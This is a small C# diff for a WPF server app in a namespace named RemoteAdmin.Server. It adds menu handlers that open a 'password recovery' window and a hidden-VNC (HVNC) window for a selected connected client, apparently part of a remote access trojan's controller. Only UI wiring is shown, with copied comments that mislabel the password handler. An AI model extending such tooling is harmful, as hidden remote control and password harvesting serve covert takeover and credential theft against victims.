@@ -645,6 +645,48 @@ namespace RemoteAdmin.Server
             inputWindow.ShowDialog();
         }
 
+        
+        private void Password_Click(object sender, RoutedEventArgs e)
+        {
+            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
+            if (selectedClient != null)
+            {
+                // Check if HVNC window is already open for this client
+                if (selectedClient.PasswordRecoveryWindow != null && selectedClient.PasswordRecoveryWindow.IsLoaded)
+                {
+                    selectedClient.PasswordRecoveryWindow.Activate();
+                }
+                else
+                {
+                    // Create new HVNC window
+                    var passwordRecovery = new Passwordrecoverywindow(selectedClient);
+                    selectedClient.PasswordRecoveryWindow = passwordRecovery;
+                    passwordRecovery.Show();
+                }
+            }
+        }
+
+        private void MenuItem_OpenHvnc_Click(object sender, RoutedEventArgs e)
+        {
+            var selectedClient = ClientsGrid.SelectedItem as ConnectedClient;
+            if (selectedClient != null)
+            {
+                // Check if HVNC window is already open for this client
+                if (selectedClient.HvncWindow != null && selectedClient.HvncWindow.IsLoaded)
+                {
+                    selectedClient.HvncWindow.Activate();
+                }
+                else
+                {
+                    // Create new HVNC window
+                    var hvncWindow = new Hvnc(selectedClient);
+                    selectedClient.HvncWindow = hvncWindow;
+                    hvncWindow.Show();
+                }
+            }
+        }
+
+
         private void TabControl_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
         {
 
